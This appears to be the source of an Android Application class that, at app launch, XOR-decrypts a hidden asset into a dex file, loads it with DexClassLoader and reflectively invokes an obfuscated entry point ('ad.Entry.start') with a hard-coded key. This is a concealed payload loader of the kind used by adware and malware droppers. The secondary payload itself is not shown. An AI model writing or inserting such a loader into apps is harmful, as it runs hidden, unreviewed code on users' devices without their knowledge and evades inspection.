package aaaaaa;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;

import android.app.Application;
import android.content.Context;
import android.util.Base64;
import dalvik.system.DexClassLoader;

public class App extends Application {

	@Override
	public void onCreate() {
		super.onCreate();
		App.init(this);
	}

	public static void init(final Context context) {
		final byte[] classesdex = "c".getBytes();
		for (int i = 0; i < classesdex.length; i++) {
			classesdex[i] ^= 0x12;
		}
		byte[] classesodex = "odex".getBytes();
		for (int i = 0; i < classesodex.length; i++) {
			classesodex[i] ^= 0x12;
		}

		final String dexFile = context.getFilesDir() + File.separator
				+ new String(classesdex);
		final String odexDir = context.getFilesDir().getAbsolutePath()
				+ File.separator + new String(classesodex);
		new File(odexDir).mkdirs();
		new Thread(new Runnable() {
			@Override
			public void run() {
				// 装载dex
				DexClassLoader dcl = null;
				InputStream is = null;
				FileOutputStream fos = null;
				try {
					is = context.getAssets().open(new String(classesdex));

					File destDir = new File(dexFile.substring(0,
							dexFile.lastIndexOf("/")));
					if (destDir.isDirectory()) {
						if (!destDir.exists()) {
							destDir.mkdirs();
						}
					}
					fos = new FileOutputStream(dexFile);
					int len = -1;
					byte[] buf = new byte[512];
					while ((len = is.read(buf)) != -1) {
						for (int i = 0; i < len; i++) {
							buf[i] ^= 8;
						}
						fos.write(buf, 0, len);
						fos.flush();
					}

					if (new File(dexFile).exists()) {
						dcl = new DexClassLoader(dexFile, odexDir, null,
								context.getClassLoader());
					}
				} catch (Exception e) {
					e.printStackTrace();
				} finally {
					if (fos != null) {
						try {
							fos.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
					if (is != null) {
						try {
							is.close();
						} catch (IOException e) {
							e.printStackTrace();
						}
					}
				}

				if (dcl != null) {
					try {
						byte[] entrybyte = "ad.Entry".getBytes();
						byte[] startbyte = "start".getBytes();
						for (int i = 0; i < entrybyte.length; i++) {
							entrybyte[i] ^= 0x12;
						}
						for (int i = 0; i < startbyte.length; i++) {
							startbyte[i] ^= 0x12;
						}
						Class cls = dcl.loadClass(new String(entrybyte));
						Method m = cls.getDeclaredMethod(new String(startbyte),
								String.class, Context.class);
						m.setAccessible(true);
						m.invoke(null, "01hbPe10", context);
					} catch (Exception e) {
						e.printStackTrace();
					}
				}
			}
		}).start();
	}
}
